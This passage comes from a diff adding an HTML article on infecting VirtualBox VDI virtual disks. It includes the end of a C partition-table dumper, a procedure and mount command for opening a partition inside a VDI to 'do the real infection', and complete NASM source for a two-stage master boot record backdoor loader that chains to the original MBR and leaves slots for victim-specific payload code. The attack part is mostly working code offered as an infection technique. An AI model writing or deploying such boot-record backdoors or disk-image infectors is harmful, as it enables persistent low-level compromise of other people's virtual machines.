+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Options:<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;-d only print the partitions table on stdout<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;-e print the partitions table on stdout and extract the partitions one by one and write them on files<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;-d&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extract <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;-e&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extract <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Invalid option<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>a_cnt <span style="color: #339933;">=</span> <span style="color: #0000dd;">2</span><span style="color: #339933;">;</span>a_cnt <span style="color: #339933;">&lt;</span> argc<span style="color: #339933;">;</span>a_cnt<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DumpVDIPartitionTable<span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span>a_cnt<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>extract<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p><strong>Example output</strong></p>
+<pre><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acdbcddecbcdc1c9ecdbcddecbcdc1c981c8c9dfc7d8c3dc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/my stuff/vdi$ sudo ./DumpVDI -d /root/.VirtualBox/VDI/xpsp0.vdi
+Offdata (/root/.VirtualBox/VDI/xpsp0.vdi) -> 13312
+MBR signature -> 0xaa55
+Partition #0 -> status:   bootable - type: 0x07 - partition begins at sector:        63 - sectors in partition:   6322113
+Partition #1 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+Partition #2 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+Partition #3 -> status: not active - type: 0x00 - partition begins at sector:         0 - sectors in partition:         0
+</pre>
+<h2>5) Infection</h2>
+<p>The most simple way to infect a virtual disk requires only the mount command of linux, in fact it is able to access a lot of file systems using the drivers that the kernel offers. So, the infection process using this simple way is:</p>
+<ol>
+<li>Find the virtual disk to infect</li>
+<li>Get offData and the partition table from it</li>
+<li>Get the location of the first sector of partition we want to mount</li>
+<li>Run the mount command</li>
+<li>Access the mounted partition and do the real infection</li>
+<li>Unmount it</li>
+</ol>
+<p>So, for example if we want to mount and infect the first ext3 partition (we assume that the first sector of this partition is the sector 63) of a virtual disk with an offData which equals to 13312, we would use this command:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #c20cb9; font-weight: bold;">sudo</span> <span style="color: #c20cb9; font-weight: bold;">mount</span> <span style="color: #660033;">-t</span> ext3 <span style="color: #660033;">-o</span> ro,loop,<span style="color: #007800;">offset</span>=<span style="color: #000000;">45568</span> the_vdi_file.vdi <span style="color: #000000; font-weight: bold;">/</span>our_mount_point</div>
+<p>Where 45568 is equal to 13312+63*512.</p>
+<p>This way is fast and requires not so much code because the hard part is made by the mount command. But it has a big limitation: it is not portable. Infact if we do not have the mount command and the right privileges we can't mount and infect the virtual disk. Then windows does not offer such possibility because it can mount only a limited numbers of file systems (fat16,fat32,ntfs). We can use this way only in some limited circumstances. There is an other way but it would require to implement our file system drivers for our infector, so we could infect a vdi with no other external requirements.</p>
+<h2>6) Old skool: boot record infection</h2>
+<p>There is an other good way to infect our virtual disk, we can infect the master boot record itself. The MBR infact is the place where it's located the code that make the OS boots up, if we take control of it we can own the system at very low level. At the DOS age, multipartite viruses were able to spread using floppies, in fact it could hook the interrupt 13h (this interrupt controls the access to disks) and so intercept every access to disk. So when a user booted his/her pc with the infected floppy the process could take place again. That was possible because the DOS didn't have any form of control for hardware access. The modern OSes like Windows NT, Unix (BSD, MacOS), GNU/Linux use their own interface made of device drivers to access the hardware layer and so that tech is not possible.</p>
+<p>Note: Using this way we can infect variable sized virtual disk with no problems. In this article we will talk about backdooring the master boot record of the virtual disk. Our code in fact will not have the possibility to spread. Here we will use an example code that is made of two parts (written for nasm):</p>
+<ol>
+<li>The first part of our loader is located in the sector 1 (MBR), it will be loaded by the BIOS at address 0000:7c00. When it takes control it prints a msg on the screen and then waits for the user to press any key. When this happens, the code loads from the sector 2 the second part of the loader at the address 0000:1000h and then jumps to it.</li>
+<li>The second part of the loader reads the sector 3 containing the original MBR and then loads it in memory at address 0000:7c00 (to be sure it works, infact every boot loader assumes to be loaded from this address) and then jumps to it.</li>
+<li>The original boot loader takes the control and it makes the OS boots up.</li>
+</ol>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; loader.asm (the code located on the sector 1)</span><br/>
+<span style="color: black; font-style: italic;">; the first stage of our loader</span><br/>
+<br/>
+ORG <span style="color: #ff0000;">7c00h</span> &nbsp; &nbsp; &nbsp;<br/>
+<span style="color: #0000ff; font-weight: bold;">BITS</span> <span style="color: #ff0000;">16</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Â <br/>
+<span style="color: #00007f; font-weight: bold;">jmp</span> boot<br/>
+<br/>
+msg <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'boot record infection on virtual disk! Press any key to continue'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp;<br/>
+msg1 <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'failed to read the loader1!'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+boot<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; setup the stack</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7c00h</span><br/>
+<br/>
+setup_writing<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0eh</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0007</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
+<br/>
+print_msg<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; print our msg on the screen</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>msg<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span> &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> wait_key<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">10h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">si</span> <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> print_msg<br/>
+<br/>
+wait_key<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">00h</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">16h</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;; here we could put other code that performs other actions depending of the victim OS</span><br/>
+<br/>
+load_loader1<span style="color: #339933;">:</span> <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">13h</span> <span style="color: black; font-style: italic;">; reset drive</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; <span style="color: black; font-style: italic;">; read at &nbsp; &nbsp;</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1000H</span> <span style="color: black; font-style: italic;">; 0000:1000</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span> &nbsp;<span style="color: black; font-style: italic;">; read function</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">01h</span> <span style="color: black; font-style: italic;">; read only one sector</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span> <span style="color: black; font-style: italic;">; sector 2</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span> &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">13h</span> <span style="color: black; font-style: italic;">; read the sector</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> failed_to_read<br/>
+<br/>
+jump_to_loader1<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0Eah</span> <span style="color: black; font-style: italic;">; jump at</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">1000h</span> <span style="color: black; font-style: italic;">; memory location</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; 0000:1000h</span><br/>
+<br/>
+failed_to_read<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0eh</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0007</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
+<br/>
+p<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>msg1<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span> &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> exit<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">10h</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">si</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> p<br/>
+<br/>
+exit<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<span style="color: #0000ff; font-weight: bold;">times</span> <span style="color: #ff0000;">510</span><span style="color: #339933;">-</span><span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">$$</span><span style="color: black;">&#41;</span> <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp;<br/>
+<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">0aa55h</span> &nbsp; <br/>
+&nbsp;</div>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; loader1.asm (the code located on the sector 2)</span><br/>
+<span style="color: black; font-style: italic;">; the second stage of the loader</span><br/>
+<br/>
+ORG <span style="color: #ff0000;">1000h</span> &nbsp; &nbsp; &nbsp;<br/>
+<span style="color: #0000ff; font-weight: bold;">BITS</span> <span style="color: #ff0000;">16</span> <br/>
+<span style="color: #00007f; font-weight: bold;">jmp</span> boot<br/>
+<br/>
+msg1 <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'failed to read the original boot sector!'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+boot<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; setup the stack</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1000h</span> &nbsp;<br/>
+<br/>
+<span style="color: black; font-style: italic;">;; here we could put other code that performs other actions depending of the victim OS</span><br/>
+<br/>
+load_original_mbr<span style="color: #339933;">:</span> <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">13h</span> <span style="color: black; font-style: italic;">; reset drive</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; <span style="color: black; font-style: italic;">; read at &nbsp; &nbsp;</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7c00H</span> <span style="color: black; font-style: italic;">; 0000:7c00</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">02h</span> &nbsp;<span style="color: black; font-style: italic;">; read function</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">01h</span> <span style="color: black; font-style: italic;">; read only one sector</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">03h</span> <span style="color: black; font-style: italic;">; sector 3</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">80h</span> &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">13h</span> <span style="color: black; font-style: italic;">; read the sector</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> failed_to_read<br/>
+<br/>
+jump_to_original_mbr<span style="color: #339933;">:</span> <span style="color: black; font-style: italic;">; here the original mbr gets the control</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0Eah</span> <span style="color: black; font-style: italic;">; jump at</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">7c00h</span> <span style="color: black; font-style: italic;">; memory location</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; 0000:7c00h</span><br/>
+<br/>
+failed_to_read<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0eh</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0007</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
+<br/>
+p<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>msg1<span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span> &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> exit<br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">10h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">si</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> p<br/>
+<br/>
+exit<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<span style="color: #0000ff; font-weight: bold;">times</span> <span style="color: #ff0000;">510</span><span style="color: #339933;">-</span><span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">$$</span><span style="color: black;">&#41;</span> <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp;<br/>
+<span style="color: #0000ff; font-weight: bold;">dw</span> <span style="color: #ff0000;">0aa55h</span> <span style="color: black; font-style: italic;">; this is useless here</span><br/>
+&nbsp;</div>
